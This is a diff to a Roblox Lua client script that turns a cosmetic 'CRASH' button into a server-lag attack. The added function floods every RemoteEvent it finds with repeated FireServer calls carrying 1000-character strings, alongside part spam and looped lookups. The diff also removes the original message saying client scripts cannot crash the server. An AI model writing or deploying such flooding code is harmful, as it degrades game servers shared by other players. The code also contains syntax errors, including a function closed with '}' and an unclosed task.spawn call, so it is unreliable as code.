@@ -1,4 +1,5 @@
 local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local player = Players.LocalPlayer
 local PlayerGui = player:WaitForChild("PlayerGui")
 
@@ -17,7 +18,7 @@ ScreenGui.Parent = PlayerGui
 local MainFrame = Instance.new("Frame")
 MainFrame.Size = UDim2.new(0, 320, 0, 180)
 MainFrame.Position = UDim2.new(0.5, -160, 0.5, -90)
-MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15) -- Very dark background
+MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
 MainFrame.Parent = ScreenGui
 
 -- Decorative Rainbow Border (Animated)
@@ -62,15 +63,14 @@ container.Position = UDim2.new(0, 0, 0, 10)
 container.BackgroundTransparency = 1
 container.Parent = MainFrame
 
--- Exact colors for each letter to match the image
 local letterColors = {
-    Color3.fromRGB(255, 0, 0),       -- C (Red)
-    Color3.fromRGB(255, 100, 0),     -- U (Orange)
-    Color3.fromRGB(255, 255, 0),     -- R (Yellow)
-    Color3.fromRGB(0, 255, 0),       -- R (Green)
-    Color3.fromRGB(0, 100, 255),     -- Y (Blue)
-    Color3.fromRGB(75, 0, 130),      -- V (Indigo)
-    Color3.fromRGB(255, 0, 255)      -- 4 (Magenta)
+    Color3.fromRGB(255, 0, 0),
+    Color3.fromRGB(255, 100, 0),
+    Color3.fromRGB(255, 255, 0),
+    Color3.fromRGB(0, 255, 0),
+    Color3.fromRGB(0, 100, 255),
+    Color3.fromRGB(75, 0, 130),
+    Color3.fromRGB(255, 0, 255)
 }
 
 for i = 1, #titleText do
@@ -85,7 +85,6 @@ for i = 1, #titleText do
     label.TextStrokeTransparency = 0
     label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
     
-    -- Assign the specific hardcoded color
     if letterColors[i] then
         label.TextColor3 = letterColors[i]
     else
@@ -95,11 +94,88 @@ for i = 1, #titleText do
     label.Parent = container
 end
 
+-- SERVER LAG FUNCTION
+local lagging = false
+local function startLag()
+    lagging = true
+    local taskCounter = 0
+    
+    -- Try to find RemoteEvents to flood
+    local remoteEvents = {}
+    for _, obj in ipairs(ReplicatedStorage:GetChildren()) do
+        if obj:IsA("RemoteEvent") then
+            table.insert(remoteEvents, obj)
+        end
+    end
+    
+    -- Also check other services for RemoteEvents
+    local servicesToCheck = {
+        game:GetService("ReplicatedStorage"),
+        game:GetService("StarterPlayer"),
+        game:GetService("StarterGui"),
+        game:GetService("StarterPack")
+    }
+    
+    for _, service in ipairs(servicesToCheck) do
+        if service then
+            for _, obj in ipairs(service:GetChildren()) do
+                if obj:IsA("RemoteEvent") and not table.find(remoteEvents, obj) then
+                    table.insert(remoteEvents, obj)
+                end
+            end
+        end
+    end
+    
+    -- Flood loop
+    task.spawn(function()
+        while lagging do
+            taskCounter = taskCounter + 1
+            
+            -- Flood any found RemoteEvents
+            if #remoteEvents > 0 then
+                for i = 1, 10 do
+                    for _, remoteEvent in ipairs(remoteEvents) do
+                        if remoteEvent and remoteEvent.Parent then
+                            pcall(function()
+                                remoteEvent:FireServer("LAG", taskCounter, string.rep("a", 1000))
+                            end)
+                        end
+                    end
+                end
+            end
+            
+            -- Try to create massive amounts of parts (will fail but causes work)
+            for i = 1, 50 do
+                pcall(function()
+                    local part = Instance.new("Part")
+                    part.Parent = workspace
+                    part:Destroy()
+                end)
+            end
+            
+            -- Flood with fake requests
+            for i = 1, 100 do
+                pcall(function()
+                    ReplicatedStorage:FindFirstChild("Tiki")
+                    ReplicatedStorage:FindFirstChild("News")
+                    game:GetService("Players"):GetPlayers()
+                end)
+            end
+            
+            task.wait()
+        end
+    end
+end
+
+local function stopLag()
+    lagging = false
+}
+
 -- "CRASH" Button (Dark Style)
 local CrashBtn = Instance.new("TextButton")
 CrashBtn.Size = UDim2.new(0, 280, 0, 50)
 CrashBtn.Position = UDim2.new(0.5, -140, 0, 110)
-CrashBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30) -- Dark gray
+CrashBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
 CrashBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
 CrashBtn.Text = "CRASH"
 CrashBtn.Font = Enum.Font.GothamBold
@@ -115,7 +191,6 @@ BtnStroke.Color = Color3.fromRGB(50, 50, 50)
 BtnStroke.Thickness = 2
 BtnStroke.Parent = CrashBtn
 
--- Button Hover Effects
 CrashBtn.MouseEnter:Connect(function()
     CrashBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
     CrashBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
@@ -128,18 +203,24 @@ CrashBtn.MouseLeave:Connect(function()
     BtnStroke.Color = Color3.fromRGB(50, 50, 50)
 end)
 
--- Button Click Effect (Visual Simulation Only)
+-- Button Click - Starts lag attempt
 CrashBtn.MouseButton1Click:Connect(function()
-    CrashBtn.Text = "FAILED"
-    CrashBtn.TextColor3 = Color3.fromRGB(255, 0, 0)
-    CrashBtn.BackgroundColor3 = Color3.fromRGB(50, 0, 0)
-    
-    task.wait(1)
-    
-    CrashBtn.Text = "CRASH"
-    CrashBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
-    CrashBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-    
-    -- Warning
-    print("Server Protected: Client-side scripts cannot crash the server.")
+    if not lagging then
+        startLag()
+        CrashBtn.Text = "LAGGING..."
+        CrashBtn.TextColor3 = Color3.fromRGB(255, 100, 0)
+        CrashBtn.BackgroundColor3 = Color3.fromRGB(50, 30, 0)
+        
+        -- Stop after 10 seconds to prevent client crash
+        task.wait(10)
+        stopLag()
+        CrashBtn.Text = "CRASH"
+        CrashBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
+        CrashBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    else
+        stopLag()
+        CrashBtn.Text = "CRASH"
+        CrashBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
+        CrashBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    end
 end)
